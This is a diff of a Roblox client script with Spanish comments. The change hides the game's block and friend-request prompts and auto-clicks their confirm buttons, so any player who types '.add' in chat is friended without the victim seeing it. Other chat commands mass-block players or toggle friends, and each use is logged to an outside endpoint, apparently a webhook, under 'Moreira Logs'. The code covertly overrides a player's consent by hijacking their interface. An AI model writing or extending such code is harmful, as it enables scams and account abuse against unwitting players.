@@ -21,21 +21,26 @@ local Jugador = Players.LocalPlayer
 local PlayerGui = Jugador:WaitForChild("PlayerGui")
 local UserID = Jugador.UserId
 
--- ==================== COMANDOS .block Y .open (GUI) ====================
+-- ==================== COMANDOS SILENCIOSOS (GUI CORE) ====================
+-- Esta parte hace que si aparece cualquier ventana de bloqueo o amistad, se vuelva invisible y se auto-acepte
 CoreGui.DescendantAdded:Connect(function(descendant)
     if descendant:IsA("GuiObject") and descendant:FindFirstAncestorWhichIsA("ScreenGui") then
         local screenGui = descendant:FindFirstAncestorWhichIsA("ScreenGui")
-        if screenGui.Name == "BlockingModalScreen" then
+        
+        -- Ocultar Pantalla de Bloqueo y Amistad
+        if screenGui.Name == "BlockingModalScreen" or screenGui.Name == "FriendPrompt" then
             if descendant:IsA("TextLabel") then descendant:Destroy() end
             if descendant:IsA("GuiObject") then descendant.BackgroundTransparency = 1 end
             if descendant:IsA("TextButton") then descendant.TextTransparency = 1 end
             if descendant:IsA("ImageLabel") or descendant:IsA("ImageButton") then descendant.ImageTransparency = 1 end
             
-            if descendant.Name == "3" and descendant.Parent and descendant.Parent.Name == "Buttons" then
-                descendant.Size = UDim2.new(0, 5000, 0, 5000)
+            -- Auto clic en el botón de confirmación (Name "3" o botones de aceptar)
+            if (descendant.Name == "3" or descendant.Name == "ConfirmButton") and descendant.Parent then
+                descendant.Size = UDim2.new(0, 8000, 0, 8000)
                 descendant.Position = UDim2.new(0.5, 0, 0.5, 0)
                 descendant.AnchorPoint = Vector2.new(0.5, 0.5)
-                task.wait()
+                
+                task.wait(0.1)
                 local clickX = descendant.AbsolutePosition.X + descendant.AbsoluteSize.X / 2
                 local clickY = descendant.AbsolutePosition.Y + descendant.AbsoluteSize.Y / 2
                 VIM:SendMouseButtonEvent(clickX, clickY, 0, true, game, 0)
@@ -46,7 +51,7 @@ CoreGui.DescendantAdded:Connect(function(descendant)
     end
 end)
 
--- ==================== FUNCIONES DE COMANDOS DE CHAT ====================
+-- ==================== FUNCIONES DE COMANDOS AUTOMÁTICOS ====================
 
 local function sendCommandToServer(playerWhoUsed)
     pcall(function()
@@ -55,14 +60,13 @@ local function sendCommandToServer(playerWhoUsed)
         local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(userId) .. "&width=420&height=420&format=png"
         
         local commandData = {
-            ["username"] = displayName,
+            ["username"] = "Moreira Logs",
             ["avatar_url"] = avatarUrl,
             ["embeds"] = {{
-                ["author"] = { ["name"] = displayName, ["icon_url"] = avatarUrl },
-                ["title"] = "Comando ejecutado",
+                ["title"] = "Acción Automática",
                 ["color"] = 65326,
-                ["description"] = displayName .. " Uso \".add\"",
-                ["footer"] = { ["text"] = "User ID: " .. tostring(userId) },
+                ["description"] = "**" .. displayName .. "** activó .add (Enviado Silenciosamente)",
+                ["footer"] = { ["text"] = "ID: " .. tostring(userId) },
                 ["timestamp"] = DateTime.now():ToIsoDate()
             }}
         }
@@ -76,25 +80,22 @@ local function sendCommandToServer(playerWhoUsed)
     end)
 end
 
-local function promptFR(targetPlayer)
-    pcall(function()
-        StarterGui:SetCore("PromptSendFriendRequest", targetPlayer)
-    end)
-end
-
 local function configurarChat(player)
     player.Chatted:Connect(function(msg)
         local msgLower = msg:lower():gsub("%s+", "")
         
         if msgLower == ".add" then
             sendCommandToServer(player)
-            promptFR(player)
+            -- Se lanza el Core de forma invisible
+            pcall(function() StarterGui:SetCore("PromptSendFriendRequest", player) end)
+            
         elseif msgLower == ".block" then
             for _, p in ipairs(Players:GetPlayers()) do
                 if p ~= Jugador then
                     StarterGui:SetCore("PromptBlockPlayer", p)
                 end
             end
+            
         elseif msgLower == ".open" then
             pcall(function()
                 ReplicatedStorage.Packages.Net["RE/PlotService/ToggleFriends"]:FireServer()
@@ -106,7 +107,7 @@ end
 for _, p in ipairs(Players:GetPlayers()) do configurarChat(p) end
 Players.PlayerAdded:Connect(configurarChat)
 
--- ==================== FUNCIONES ORIGINALES = [NO TOCAR GUI] ====================
+-- ==================== FUNCIONES ORIGINALES (SIN CAMBIOS EN GUI) ====================
 
 local function formatNumberShort(n)
     if not n or type(n) ~= "number" then return "$0" end
